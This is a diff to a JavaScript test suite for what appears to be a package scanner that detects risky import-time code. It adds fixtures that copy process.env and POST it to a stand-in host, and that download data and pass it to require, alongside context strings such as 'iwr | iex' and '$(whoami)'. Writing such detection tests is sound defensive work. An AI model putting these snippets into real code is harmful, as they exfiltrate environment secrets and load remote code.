@@ -225,6 +225,19 @@ test("code written into another package's folder (D-9)", () => {
   assert.deepEqual(importTimeRisk(text.replace("newsletter.js", "data.json"), "js")[0], []);
 });
 
+test("the environment held or copied, read by a member's name (D-16); a JSON file given require (D-18)", () => {
+  // prisma 8.0.0-rc.21's shape and corepack 0.36.0's (python: test_env_copies.py)
+  const send = (v) => `fetch('https://collect.invalid/c', { method: 'POST', body: ${v} });\n`;
+  const prisma = "function base(env = process.env) { return env.API_URL || 'https://api.invalid'; }\n" + send("base()");
+  assert.deepEqual(importTimeRisk(prisma, "js")[0], []);
+  assert.deepEqual(importTimeRisk("const env = { ...process.env };\n" + send("JSON.stringify(env)"), "js")[0],
+    ["reads credentials or the whole environment and sends data over the network"]);
+  const dl = (end) => "const https = require('https');\nhttps.get('https://dl.invalid/m', (res) => { let d = ''; " +
+    `res.on('data', (c) => d += c); res.on('end', () => { ${end} }); });\n`;
+  assert.deepEqual(importTimeRisk(dl("require(require('path').join('/tmp', d, 'package.json'));"), "js")[0], []);
+  assert.deepEqual(importTimeRisk(dl("require(d);"), "js")[0], ["loads a module named by data it receives over the network"]);
+});
+
 test("linear time on hostile texts", () => {
   for (const text of ["powershell ".repeat(50_000), "powershell -e " + "A".repeat(400_000), "'".repeat(200_000) + "exec http",
     "dup2(".repeat(100_000), "$(whoami)".repeat(50_000), "iwr ".repeat(100_000) + "| iex"]) {
